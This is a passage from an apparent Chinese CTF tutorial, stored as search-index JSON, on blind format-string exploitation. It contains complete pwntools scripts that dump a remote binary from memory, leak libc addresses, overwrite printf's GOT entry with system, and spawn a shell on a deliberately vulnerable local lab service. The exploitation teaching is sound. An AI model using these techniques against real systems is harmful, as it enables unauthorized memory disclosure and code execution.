\u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9**\u4ee5 binary file \u52a0\u8f7d**\uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76**\u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 **\uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002 \u4ece .text \u6bb5\u5f00\u59cb \u00b6 \u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote ( '127.0.0.1' , 10001 ) p . recv () p . sendline ( 'nameaaa' ) p . recv () def where_is_start ( ret_index = null ): return_addr = 0 for i in range ( 400 ): payload = ' %%%d $p.TMP' % ( i ) p . sendline ( payload ) p . recvuntil ( 'right:' ) val = p . recvuntil ( '.TMP' ) log . info ( str ( i * 4 ) + ' ' + val . strip () . ljust ( 10 )) if ( i * 4 == ret_index ): return_addr = int ( val . strip ( '.TMP' ) . ljust ( 10 )[ 2 :], 16 ) return return_addr p . recvrepeat ( 0.2 ) start_addr = where_is_start () \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context . log_level = 'info' r = remote ( '127.0.0.1' , 10001 ) def leak ( addr ): payload = \"%9$s.TMP\" + p32 ( addr ) r . sendline ( payload ) print \"leaking:\" , hex ( addr ) r . recvuntil ( 'right:' ) ret = r . recvuntil ( \".TMP\" , drop = True ) print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = r . recvrepeat ( 0.2 ) return ret # name r . recv () r . sendline ( 'nameaaa' ) r . recv () # leak begin = 0x8048510 #begin = 0x8048000 text_seg = '' try : while True : ret = leak ( begin ) text_seg += ret begin += len ( ret ) if len ( ret ) == 0 : # nil begin += 1 text_seg += ' \\x00 ' except Exception as e : print e finally : print '[+]' , len ( text_seg ) with open ( 'dump_bin_text' , 'wb' ) as f : f . write ( text_seg ) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9**\u4ee5 binary file \u52a0\u8f7d**\uff0c\u52fe\u9009**Load as code segment**\uff0c\u5e76**\u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 **\uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002 \u89e3\u9898\u6d41\u7a0b \u00b6 \u7740\u91cd\u8bb0\u5f55**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253**\uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u00b6 \u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a \u6cc4\u9732 got.plt \u00b6 \u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32 ( printf_plt ) p . sendline ( payload ) # \\xff\\x25 junk code p . recvuntil ( 'right: \\xff\\x25 ' ) printf_got_plt = u32 ( p . recv ( 4 )) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [ 0x804a018 ] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002 \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u00b6 \u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32 ( printf_got_plt ) p . sendline ( payload ) p . recvuntil ( 'right:' ) printf_got = u32 ( p . recv ( 4 )) \u6cc4\u9732 libc \u57fa\u5740& system \u5730\u5740 \u00b6 \u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0 \u4efb\u610f\u5199\u4fee\u6539 printf@got.plt \u00b6 payload = fmtstr_payload ( 7 , { printf_got_plt : system_addr }) p . sendline ( payload ) exp \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context . log_level = 'debug' p = remote ( '127.0.0.1' , 10001 ) def leak ( addr ): payload = \"%9$s.TMP\" + p32 ( addr ) p . sendline ( payload ) print \"leaking:\" , hex ( addr ) p . recvuntil ( 'right:' ) resp = p . recvuntil ( \".TMP\" ) ret = resp [: - 4 :] print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = p . recvrepeat ( 0.2 ) return ret printf_plt = 0x8048490 # name p . recv () p . sendline ( 'nameaaa' ) p . recv () # leak printf@got.plt payload = \"%9$sskye\" + p32 ( printf_plt ) p . sendline ( payload ) # \\xff\\x25 junk code p . recvuntil ( 'right: \\xff\\x25 ' ) printf_got_plt = u32 ( p . recv ( 4 )) log . info ( \"printf_got_plt:\" + hex ( printf_got_plt )) # leak printf@got payload = \"%9$sskye\" + p32 ( printf_got_plt ) p . sendline ( payload ) p . recvuntil ( 'right:' ) printf_got = u32 ( p . recv ( 4 )) log . info ( \"printf_got:\" + hex ( printf_got )) # libcdatabase libc_base = printf_got - 0x00049670 log . info ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + 0x0003ada0 log . info ( \"system_addr:\" + hex ( system_addr )) # overwrite payload = fmtstr_payload ( 7 , { printf_got_plt : system_addr }) p . sendline ( payload ) p . sendline ( '/bin/sh \\x00 ' ) p . interactive () 64 \u4f4d\u5229\u7528\u624b\u6cd5 \u00b6 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u00b6 \u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u00b6 \u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u00b6 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002 dump \u7a0b\u5e8f \u00b6 \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context . log_level = 'info' #r = remote('127.0.0.1',10001) r = remote ( '127.0.0.1' , 10000 ) def leak ( addr ): payload = \"%9$s.TMP\" + p64 ( addr ) r . sendline ( payload ) print \"leaking:\" , hex ( addr ) r . recvuntil ( 'right:' ) ret = r . recvuntil ( \".TMP\" , drop = True ) print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = r . recvrepeat ( 0.2 ) return ret # name r . recv () r . sendline ( 'moxiaoxi' ) r . recv () # leak begin = 0x400000 #0x8048000 text_seg = '' try : while True : ret = leak ( begin ) text_seg += ret begin += len ( ret ) if len ( ret ) == 0 : # nil begin += 1 text_seg += ' \\x00 ' except Exception as e : print e finally : print '[+]' , len ( text_seg ) with open ( 'dump_bin_64' , 'wb' ) as f : f . write ( text_seg ) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context . log_level = 'debug' p = remote ( '127.0.0.1' , 10000 ) def leak ( addr ): payload = \"%9$s.TMP\" + p64 ( addr ) p . sendline ( payload ) print \"leaking:\" , hex ( addr ) p . recvuntil ( 'right:' ) resp = p . recvuntil ( \".TMP\" ) ret = resp [: - 4 :] print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = p . recvrepeat ( 0.2 ) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p . recv () p . sendline ( 'moxiaoxi' ) p . recv () # leak printf@got payload = \"%9$s.TMP\" + p64 ( printf_got_plt + 1 ) p . sendline ( payload ) p . recvuntil ( 'right:' ) printf_got = u64 ( p . recv ( 5 ) . ljust ( 7 , ' \\x00 ' ) + ' \\x00 ' ) << 8 log . info ( \"printf_got:\" + hex ( printf_got )) # libcdatabase libc_base = printf_got - 0x055800 log . info ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + 0x045390 log . info ( \"system_addr:\" + hex ( system_addr )) one = p64 ( system_addr )[: 2 ] two = p64 ( system_addr >> 16 )[: 2 ] payload = \" %9104c %12$hn %54293c %13$hn\" + 'a' * 7 payload += p64 ( printf_got_plt ) + p64 ( printf_got_plt + 2 ) p . sendline ( payload ) p . recv () p . sendline ( '/bin/sh \\x00 ' ) p . interactive () \u66f4\u591a\u5b9e\u4f8b \u00b6 axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2 \u53c2\u8003 \u00b6 ctf-wiki leak me pwn-\u76f2\u6253","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#bilnd-","text":"","title":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_1","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b","title":"\u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_2","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528","title":"\u539f\u7406"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_3","text":"\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e","title":"\u4f7f\u7528\u6761\u4ef6"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#32","text":"","title":"32 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_4","text":"\u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main ( int argc , char * argv []) { setbuf ( stdin , 0L L ); setbuf ( stdout , 0L L ); setbuf ( stderr , 0L L ); int flag ; char buf [ 1024 ]; FILE * f ; puts ( \"What's your name?\" ); fgets ( buf , 1024 , stdin ); printf ( \"Hi, \" ); printf ( \"%s\" , buf ); putchar ( '\\n' ); flag = 1 ; while ( flag == 1 ){ puts ( \"Do you want the flag?\" ); memset ( buf , '\\0' , 1024 ); read ( STDIN_FILENO , buf , 100 ); if ( ! strcmp ( buf , \"no \\n \" )){ printf ( \"I see. Good bye.\" ); return 0 ; } else { printf ( \"Your input isn't right:\" ); printf ( buf ); printf ( \"Please Try again! \\n \" ); } fflush ( stdout ); } return 0 ; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_5","text":"\u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_6","text":"\u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#dump","text":"dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002","title":"dump \u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_7","text":"\u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 